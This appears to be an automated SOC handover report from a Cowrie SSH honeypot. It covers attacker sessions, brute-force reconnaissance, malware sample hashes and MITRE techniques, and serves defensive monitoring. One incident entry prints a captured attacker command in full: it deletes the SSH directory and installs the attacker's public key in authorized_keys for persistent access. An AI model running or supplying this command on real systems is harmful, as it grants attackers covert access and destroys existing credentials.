| **Source IP** | `43.100.77[.]140` |
| **First Seen** | 2026-03-18 12:30 |
| **Last Seen** | 2026-03-18 12:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 12:30:48` | `cowrie.session.connect` |
| `2026-03-18 12:30:48` | `cowrie.client.version` |
| `2026-03-18 12:30:48` | `cowrie.client.kex` |
| `2026-03-18 12:30:49` | `cowrie.login.success` |
| `2026-03-18 12:30:49` | `cowrie.session.params` |
| `2026-03-18 12:30:49` | `cowrie.command.input` |
| `2026-03-18 12:30:49` | `cowrie.command.failed` |
| `2026-03-18 12:30:49` | `cowrie.log.closed` |
| `2026-03-18 12:30:49` | `cowrie.session.params` |
| `2026-03-18 12:30:49` | `cowrie.command.input` |
| `2026-03-18 12:30:49` | `cowrie.session.file_download` |
| `2026-03-18 12:30:49` | `cowrie.log.closed` |
| `2026-03-18 12:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.77[.]140` to AbuseIPDB if not already reported
- [ ] Block `43.100.77[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e874a62ae96

| Field | Detail |
|---|---|
| **Source IP** | `43.100.77[.]140` |
| **First Seen** | 2026-03-18 12:30 |
| **Last Seen** | 2026-03-18 12:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 12:30:51` | `cowrie.session.connect` |
| `2026-03-18 12:30:51` | `cowrie.client.version` |
| `2026-03-18 12:30:51` | `cowrie.client.kex` |
| `2026-03-18 12:30:52` | `cowrie.login.success` |
| `2026-03-18 12:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.77[.]140` to AbuseIPDB if not already reported
- [ ] Block `43.100.77[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `72.255.26[.]45` | **25** | 2026-03-18 05:16 | 2026-03-18 05:22 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `103.7.41[.]144` | **15** | 2026-03-18 06:09 | 2026-03-18 06:16 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.4.240[.]226` | **15** | 2026-03-18 07:49 | 2026-03-18 08:24 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.176.182[.]178` | **15** | 2026-03-18 01:36 | 2026-03-18 02:09 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.100.77[.]140` | **15** | 2026-03-18 12:18 | 2026-03-18 12:33 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.174[.]68` | **14** | 2026-03-18 00:23 | 2026-03-18 01:11 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `180.76.245[.]60` | **14** | 2026-03-18 04:47 | 2026-03-18 05:06 | 15m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.88[.]251` | **12** | 2026-03-18 04:54 | 2026-03-18 05:14 | 20m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.106[.]113` | **10** | 2026-03-18 03:13 | 2026-03-18 03:34 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]213` | **10** | 2026-03-18 11:00 | 2026-03-18 11:09 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.93[.]214` | **10** | 2026-03-18 06:11 | 2026-03-18 06:17 | 12m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `177.92.51[.]57` | **10** | 2026-03-18 10:56 | 2026-03-18 11:18 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.248.8[.]33` | **10** | 2026-03-18 10:45 | 2026-03-18 10:56 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `95.70.212[.]76` | **10** | 2026-03-18 07:49 | 2026-03-18 08:11 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.81.33[.]183` | **7** | 2026-03-18 00:00 | 2026-03-18 01:38 | 3m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `3.129.187[.]38` | **6** | 2026-03-18 03:40 | 2026-03-18 03:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.36.97[.]70` | **4** | 2026-03-18 04:22 | 2026-03-18 04:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.110.144[.]156` | **3** | 2026-03-18 01:00 | 2026-03-18 01:06 | 1m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `116.110.23[.]141` | **3** | 2026-03-18 01:02 | 2026-03-18 01:05 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `117.2.49[.]125` | **3** | 2026-03-18 03:20 | 2026-03-18 03:24 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `103.237.144[.]204` | **2** | 2026-03-18 11:14 | 2026-03-18 11:18 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `189.190.166[.]109` | **2** | 2026-03-18 10:58 | 2026-03-18 11:00 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.80.104[.]232` | **2** | 2026-03-18 03:33 | 2026-03-18 03:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.84.153[.]170` | **2** | 2026-03-18 09:41 | 2026-03-18 09:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `100.53.3[.]126` | 1 | 2026-03-18 12:56 | 2026-03-18 12:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]35` | 1 | 2026-03-18 10:49 | 2026-03-18 10:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.71.39[.]17` | 1 | 2026-03-18 06:17 | 2026-03-18 06:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.93.37[.]178` | 1 | 2026-03-18 05:48 | 2026-03-18 05:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.157.40[.]219` | 1 | 2026-03-18 12:26 | 2026-03-18 12:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.120.49[.]14` | 1 | 2026-03-18 10:30 | 2026-03-18 10:30 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.184.45[.]204` | 1 | 2026-03-18 06:27 | 2026-03-18 06:27 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.26.101[.]76` | 1 | 2026-03-18 01:52 | 2026-03-18 01:52 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.4.79[.]138` | 1 | 2026-03-18 01:40 | 2026-03-18 01:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.193.187[.]154` | 1 | 2026-03-18 05:57 | 2026-03-18 05:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.33.44[.]32` | 1 | 2026-03-18 05:10 | 2026-03-18 05:11 | 30s | 0 | `T1592` | 🟢 LOW |
| `115.190.10[.]158` | 1 | 2026-03-18 10:50 | 2026-03-18 10:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.244.235[.]242` | 1 | 2026-03-18 10:43 | 2026-03-18 10:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.110.148[.]145` | 1 | 2026-03-18 01:32 | 2026-03-18 01:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.160.131[.]100` | 1 | 2026-03-18 05:10 | 2026-03-18 05:12 | 116s | 0 | `T1592` | 🟢 LOW |
| `117.50.51[.]119` | 1 | 2026-03-18 01:18 | 2026-03-18 01:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]49` | 1 | 2026-03-18 04:47 | 2026-03-18 04:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.122.196[.]230` | 1 | 2026-03-18 07:25 | 2026-03-18 07:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.163.178[.]146` | 1 | 2026-03-18 04:53 | 2026-03-18 04:53 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.198.96[.]190` | 1 | 2026-03-18 02:59 | 2026-03-18 02:59 | 12s | 0 | `T1592` | 🟢 LOW |
| `120.211.5[.]35` | 1 | 2026-03-18 10:45 | 2026-03-18 10:45 | 3s | 0 | `T1592` | 🟢 LOW |
| `120.62.8[.]17` | 1 | 2026-03-18 10:47 | 2026-03-18 10:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.196.27[.]240` | 1 | 2026-03-18 04:16 | 2026-03-18 04:18 | 81s | 0 | `T1592` | 🟢 LOW |
| `122.160.50[.]155` | 1 | 2026-03-18 10:11 | 2026-03-18 10:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.129.157[.]189` | 1 | 2026-03-18 10:23 | 2026-03-18 10:23 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.19.156[.]46` | 1 | 2026-03-18 01:58 | 2026-03-18 01:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.208.17[.]16` | 1 | 2026-03-18 01:21 | 2026-03-18 01:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `125.64.209[.]11` | 1 | 2026-03-18 08:53 | 2026-03-18 08:53 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.135.63[.]154` | 1 | 2026-03-18 08:22 | 2026-03-18 08:22 | 15s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-03-18 06:56 | 2026-03-18 06:56 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-03-18 12:04 | 2026-03-18 12:04 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `161.142.238[.]29` | 1 | 2026-03-18 02:24 | 2026-03-18 02:24 | 31s | 0 | `T1592` | 🟢 LOW |
| `165.22.78[.]143` | 1 | 2026-03-18 02:55 | 2026-03-18 02:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.206.113[.]91` | 1 | 2026-03-18 04:34 | 2026-03-18 04:34 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.194[.]136` | 1 | 2026-03-18 12:45 | 2026-03-18 12:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.185.227[.]77` | 1 | 2026-03-18 03:55 | 2026-03-18 03:55 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.185.29[.]233` | 1 | 2026-03-18 08:09 | 2026-03-18 08:09 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.97.5[.]22` | 1 | 2026-03-18 07:00 | 2026-03-18 07:00 | 5s | 0 | `T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-03-18 10:46 | 2026-03-18 10:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.84[.]77` | 1 | 2026-03-18 10:59 | 2026-03-18 11:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-03-18 07:13 | 2026-03-18 07:15 | 90s | 1 | `T1110.001` | 🟢 LOW |
| `180.76.175[.]142` | 1 | 2026-03-18 11:44 | 2026-03-18 11:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.212.86[.]140` | 1 | 2026-03-18 01:25 | 2026-03-18 01:26 | 12s | 0 | `T1592` | 🟢 LOW |
| `182.139.39[.]150` | 1 | 2026-03-18 10:03 | 2026-03-18 10:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.12[.]224` | 1 | 2026-03-18 01:46 | 2026-03-18 01:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]181` | 1 | 2026-03-18 04:00 | 2026-03-18 04:00 | 15s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]181` | 1 | 2026-03-18 10:49 | 2026-03-18 10:51 | 102s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-03-18 10:48 | 2026-03-18 10:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.93.165[.]103` | 1 | 2026-03-18 03:15 | 2026-03-18 03:15 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.215.204[.]109` | 1 | 2026-03-18 12:41 | 2026-03-18 12:42 | 3s | 0 | `T1592` | 🟢 LOW |
| `190.223.36[.]108` | 1 | 2026-03-18 09:43 | 2026-03-18 09:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.84.34[.]85` | 1 | 2026-03-18 02:18 | 2026-03-18 02:18 | 35s | 0 | `T1592` | 🟢 LOW |
| `211.223.41[.]90` | 1 | 2026-03-18 07:54 | 2026-03-18 07:54 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `216.236.215[.]9` | 1 | 2026-03-18 07:15 | 2026-03-18 07:15 | 2s | 0 | `T1592` | 🟢 LOW |
| `218.94.115[.]164` | 1 | 2026-03-18 12:01 | 2026-03-18 12:02 | 1s | 0 | `T1592` | 🟢 LOW |
| `220.123.74[.]61` | 1 | 2026-03-18 01:50 | 2026-03-18 01:51 | 14s | 0 | `T1592` | 🟢 LOW |
| `222.86.168[.]224` | 1 | 2026-03-18 11:47 | 2026-03-18 11:47 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.45.132[.]18` | 1 | 2026-03-18 06:31 | 2026-03-18 06:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `34.146.217[.]105` | 1 | 2026-03-18 11:10 | 2026-03-18 11:10 | 4s | 0 | `T1592` | 🟢 LOW |
| `34.41.211[.]48` | 1 | 2026-03-18 08:48 | 2026-03-18 08:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.154.134[.]146` | 1 | 2026-03-18 03:04 | 2026-03-18 03:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.212.227[.]224` | 1 | 2026-03-18 06:20 | 2026-03-18 06:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.224.125[.]54` | 1 | 2026-03-18 10:46 | 2026-03-18 10:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]45` | 1 | 2026-03-18 03:17 | 2026-03-18 03:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.148[.]185` | 1 | 2026-03-18 11:06 | 2026-03-18 11:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.148[.]2` | 1 | 2026-03-18 08:25 | 2026-03-18 08:25 | 11s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]64` | 1 | 2026-03-18 09:08 | 2026-03-18 09:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.152[.]237` | 1 | 2026-03-18 12:07 | 2026-03-18 12:07 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.154[.]160` | 1 | 2026-03-18 07:11 | 2026-03-18 07:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.142.216[.]61` | 1 | 2026-03-18 12:44 | 2026-03-18 12:44 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.36.11[.]59` | 1 | 2026-03-18 09:23 | 2026-03-18 09:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.43.32[.]40` | 1 | 2026-03-18 12:46 | 2026-03-18 12:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.141[.]202` | 1 | 2026-03-18 13:01 | 2026-03-18 13:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `71.12.241[.]225` | 1 | 2026-03-18 03:11 | 2026-03-18 03:11 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.95.13[.]185` | 1 | 2026-03-18 01:20 | 2026-03-18 01:22 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.213.215[.]131` | 1 | 2026-03-18 07:59 | 2026-03-18 08:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `81.214.75[.]248` | 1 | 2026-03-18 11:02 | 2026-03-18 11:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.212.82[.]215` | 1 | 2026-03-18 11:22 | 2026-03-18 11:22 | 7s | 0 | `T1592` | 🟢 LOW |
| `90.224.175[.]26` | 1 | 2026-03-18 10:28 | 2026-03-18 10:28 | 6s | 0 | `T1592` | 🟢 LOW |
| `94.200.95[.]18` | 1 | 2026-03-18 04:09 | 2026-03-18 04:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.70.136[.]88` | 1 | 2026-03-18 02:34 | 2026-03-18 02:34 | 33s | 0 | `T1592` | 🟢 LOW |
| `96.69.42[.]141` | 1 | 2026-03-18 05:51 | 2026-03-18 05:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.41.211[.]48` | US | Google LLC | **100** ⚠️ | 35 |
| `34.146.217[.]105` | JP | Google LLC | **100** ⚠️ | 50 |
| `121.196.27[.]240` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 24 |
| `165.22.78[.]143` | DE | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `116.110.156[.]14` | VN | Viettel Group | **100** ⚠️ | 0 |
| `34.176.182[.]178` | CL | Google LLC | **100** ⚠️ | 7 |
| `103.93.37[.]178` | IN | Ngc Broadband Pvt. Ltd. | **100** ⚠️ | 50 |
| `20.84.153[.]170` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `216.236.215[.]9` | US | New Skies Satellites, Inc. | **100** ⚠️ | 12 |
| `183.171.12[.]224` | MY | Celcom Axiata Berhad | **100** ⚠️ | 12 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 470 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 318 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 83 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |

---

## 🔕 False Positive Summary (550 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 5 |
| AbuseIPDB score 13 below threshold 25 | 7 |
| AbuseIPDB score 16 below threshold 25 | 15 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 7 |
| AbuseIPDB score 24 below threshold 25 | 31 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 475 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 929 cases |
| Tool 34  | Credential Extractor        | ✅ 403 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 0 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 153 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 550 filtered (59.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 79 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 78 priority case(s) shown individually · 106 recon entry/entries in table (24 group(s) consolidating 219 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-18T13:07:02Z_
